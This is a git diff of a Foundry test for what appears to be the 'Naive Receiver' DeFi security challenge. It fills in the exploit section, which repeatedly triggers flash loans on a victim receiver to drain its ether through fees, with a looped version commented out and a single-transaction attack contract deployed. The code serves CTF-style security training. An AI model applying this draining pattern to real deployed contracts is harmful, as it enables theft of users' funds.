@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
+import {AttackFlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
 
 contract NaiveReceiver is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -33,9 +34,7 @@ contract NaiveReceiver is Test {
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
         assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);
 
-        flashLoanReceiver = new FlashLoanReceiver(
-            payable(naiveReceiverLenderPool)
-        );
+        flashLoanReceiver = new FlashLoanReceiver(payable(naiveReceiverLenderPool));
         vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
         vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
 
@@ -48,7 +47,15 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        // 10 transactions to drain the pool
+        //for (uint256 i = 0; i < 10; i++) {
+        //    naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        //}
+        // 1 transaction to drain the pool
+        AttackFlashLoanReceiver attackFlashLoanReceiver =
+            new AttackFlashLoanReceiver(payable(naiveReceiverLenderPool), payable(flashLoanReceiver));
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
